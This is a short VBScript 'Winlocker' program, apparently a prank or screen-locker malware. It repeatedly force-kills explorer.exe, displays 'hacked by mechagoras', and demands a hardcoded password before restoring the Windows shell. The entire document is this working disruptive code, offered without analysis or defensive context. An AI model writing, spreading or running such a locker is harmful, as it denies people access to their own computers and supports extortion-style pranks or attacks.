Do
set t=createobject("Wscript.Shell") 
set kill = createobject("wscript.shell") 
kill.run"taskkill /f /im explorer.exe",0
msgbox"hacked by mechagoras"
x = inputbox("Good luck bruteforcing my system","mechagoras")
if (x = "ochenslojniyparol") then  
msgbox">:P",64,"Winlocker"
t.run"explorer"
exit do
else
msgbox"nah >:)",16,"Winlocker"
end if
loop